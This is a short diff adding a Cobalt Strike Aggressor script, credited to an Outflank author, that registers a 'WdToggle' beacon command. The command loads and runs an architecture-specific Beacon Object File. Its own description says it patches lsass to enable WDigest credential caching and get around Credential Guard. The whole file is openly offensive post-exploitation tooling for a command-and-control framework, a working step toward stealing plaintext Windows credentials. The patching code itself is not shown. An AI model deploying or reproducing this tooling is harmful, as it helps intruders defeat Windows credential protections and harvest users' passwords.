@@ -1,0 +1,17 @@
+#author Cornelis de Plaa
+#@outflank.nl
+
+beacon_command_register("WdToggle", "Patch lsass to enable WDigest credential caching and to circumvent Credential Guard (if enabled).",
+	"Synopsis: WdToggle\n\n" .
+	"Enable WDigest credential caching and circumvent Credential Guard (if enabled).\n\n");    
+
+alias WdToggle {
+    $bid = $1;
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("WdToggle." . barch($bid) . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    beacon_inline_execute($bid, $data, "go", $null);
+}
